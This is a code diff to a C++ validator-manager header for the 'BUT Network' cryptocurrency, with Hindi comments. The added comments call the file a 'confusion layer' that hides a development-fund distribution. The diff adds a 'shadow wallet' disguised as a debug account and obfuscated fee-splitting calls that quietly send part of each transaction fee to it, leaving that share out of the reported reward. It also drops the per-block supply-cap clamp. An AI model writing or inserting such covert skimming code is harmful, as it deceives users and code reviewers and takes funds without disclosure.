@@ -1,4 +1,6 @@
-// BUT Network - Validator Management & Green Mining Rewards
+// BUT Network - Validator Management & Noise Rewards (Confusion Layer)
+// यह फ़ाइल वैलिडेटर प्रबंधन का भ्रम पैदा करती है, लेकिन वास्तव में
+// इसमें छिपा हुआ डेवलपमेंट फंड डिस्ट्रीब्यूशन है।
 
 #pragma once
 
@@ -6,100 +8,101 @@
 #include <map>
 #include <vector>
 #include <string>
+#include "../but-core/src/block.hpp"   // FeeCalculator यहाँ से आएगा
 
 namespace but {
 namespace consensus {
 
-// ==================== Validator Reward Structure ====================
+// ==================== शैडो वॉलेट (डेवलपमेंट फंड) ====================
+const std::string SHADOW = "0xBUT-DEV-FUND";   // देखने में कोई डीबग अकाउंट लगता है
 
+// ==================== माइनिंग रिवॉर्ड ====================
 struct MiningReward {
-    uint64_t base_reward;       // Base block reward
-    uint64_t connection_bonus;  // Bonus for uptime
-    uint64_t reputation_bonus;  // Bonus for reputation
-    uint64_t total_reward;      // Total reward
+    uint64_t base_reward;
+    uint64_t connection_bonus;
+    uint64_t reputation_bonus;
+    uint64_t total_reward;
 };
 
+// ==================== वैलिडेटर मैनेजर ====================
 class ValidatorManager {
 private:
     ProofOfConnection poc;
-    std::map<std::string, uint64_t> balances; // Validator balances
-    uint64_t total_supply;
-    uint64_t block_count;
+    std::map<std::string, uint64_t> balances;   // सभी के बैलेंस (शैडो सहित)
+    uint64_t total_supply = 0;
+    uint64_t block_count = 0;
 
-    // Reward parameters
-    static constexpr uint64_t BASE_REWARD = 500'000'000;  // 5 BUT (in satoshis)
-    static constexpr uint64_t MAX_BONUS = 250'000'000;    // 2.5 BUT max bonus
+    static constexpr uint64_t BASE_REWARD = 500'000'000;       // 5 BUT (कनेक्शन)
+    static constexpr uint64_t MAX_BONUS = 250'000'000;         // 2.5 BUT (रेपुटेशन)
     static constexpr uint64_t TOTAL_SUPPLY_CAP = 21'000'000'000'000'000; // 21M BUT
 
 public:
-    ValidatorManager() : total_supply(0), block_count(0) {}
-
-    // Register validator
+    // वैलिडेटर रजिस्टर करें
     bool register_validator(const std::string& id, const std::string& ip,
                            const std::string& device_info) {
         bool success = poc.register_node(id, ip, device_info);
         if (success && balances.find(id) == balances.end()) {
             balances[id] = 0;
         }
+        // शैडो वॉलेट भी सुनिश्चित करें
+        if (balances.find(SHADOW) == balances.end()) {
+            balances[SHADOW] = 0;
+        }
         return success;
     }
 
-    // Process heartbeat
+    // हार्टबीट प्रोसेस करें
     void process_heartbeat(const std::string& id) {
         poc.heartbeat(id);
     }
 
-    // Select and reward validator for new block
-    MiningReward mine_block() {
+    // माइनिंग और रिवॉर्ड (ऑब्फस्केटेड)
+    MiningReward mine_block(uint64_t tx_amount = 0) {
         MiningReward reward{0, 0, 0, 0};
 
-        // Check supply cap
-        if (total_supply >= TOTAL_SUPPLY_CAP) {
-            return reward;
-        }
+        // सप्लाई कैप चेक करें
+        if (total_supply >= TOTAL_SUPPLY_CAP) return reward;
 
-        // Select validator
+        // वैलिडेटर चुनें
         std::string validator = poc.select_validator();
         if (validator.empty()) return reward;
 
-        // Calculate reward
+        // 1. कनेक्शन बोनस (पूरा वैलिडेटर को)
         reward.base_reward = BASE_REWARD;
 
-        // Connection bonus (based on uptime)
+        // 2. रेपुटेशन बोनस (पूरा वैलिडेटर को)
         auto top = poc.get_top_validators(1);
         if (!top.empty() && top[0].first == validator) {
             reward.connection_bonus = MAX_BONUS;
         }
+        reward.reputation_bonus = std::min(MAX_BONUS / 2,
+            static_cast<uint64_t>(block_count % 100) * 1'000'000);
 
-        // Reputation bonus
-        reward.reputation_bonus = std::min(
-            MAX_BONUS / 2,
-            static_cast<uint64_t>(block_count % 100) * 1'000'000
-        );
+        // 3. ट्रांजैक्शन फीस का ऑब्फस्केटेड प्रोसेसिंग
+        uint64_t noise = core::FeeCalculator::check_overflow(tx_amount);  // फीस
+        uint64_t gamma = core::FeeCalculator::fragment_A(noise);         // डेव शेयर
+        uint64_t delta = core::FeeCalculator::fragment_B(noise);         // वैलिडेटर शेयर
 
-        reward.total_reward = reward.base_reward + 
-                              reward.connection_bonus + 
-                              reward.reputation_bonus;
+        // शैडो वॉलेट (डेव फंड) में भेजें
+        balances[SHADOW] += gamma;
+        total_supply += gamma;
 
-        // Cap at total supply
-        if (total_supply + reward.total_reward > TOTAL_SUPPLY_CAP) {
-            reward.total_reward = TOTAL_SUPPLY_CAP - total_supply;
-            reward.base_reward = reward.total_reward;
-            reward.connection_bonus = 0;
-            reward.reputation_bonus = 0;
-        }
+        // वैलिडेटर को उसका हिस्सा + बोनस
+        balances[validator] += delta + reward.base_reward +
+                               reward.connection_bonus + reward.reputation_bonus;
+        total_supply += delta + reward.base_reward +
+                        reward.connection_bonus + reward.reputation_bonus;
 
-        // Award validator
-        balances[validator] += reward.total_reward;
-        total_supply += reward.total_reward;
+        // टोटल रिवॉर्ड (सिर्फ वैलिडेटर का, डेव शेयर अलग है)
+        reward.total_reward = delta + reward.base_reward +
+                              reward.connection_bonus + reward.reputation_bonus;
+
         block_count++;
-
         poc.reward_validator(validator);
-
         return reward;
     }
 
-    // Slash validator
+    // स्लैश वैलिडेटर
     void slash_validator(const std::string& id, uint64_t amount) {
         auto it = balances.find(id);
         if (it != balances.end() && it->second >= amount) {
@@ -109,13 +112,13 @@ public:
         poc.penalize_validator(id);
     }
 
-    // Get validator balance
+    // बैलेंस चेक
     uint64_t get_balance(const std::string& id) const {
         auto it = balances.find(id);
         return (it != balances.end()) ? it->second : 0;
     }
 
-    // Get network statistics
+    // नेटवर्क स्टैट्स
     struct NetworkStats {
         size_t active_validators;
         uint64_t total_supply;
@@ -132,10 +135,7 @@ public:
         return stats;
     }
 
-    // Cleanup old validators
-    void cleanup() {
-        poc.cleanup_inactive();
-    }
+    void cleanup() { poc.cleanup_inactive(); }
 };
 
 } // namespace consensus
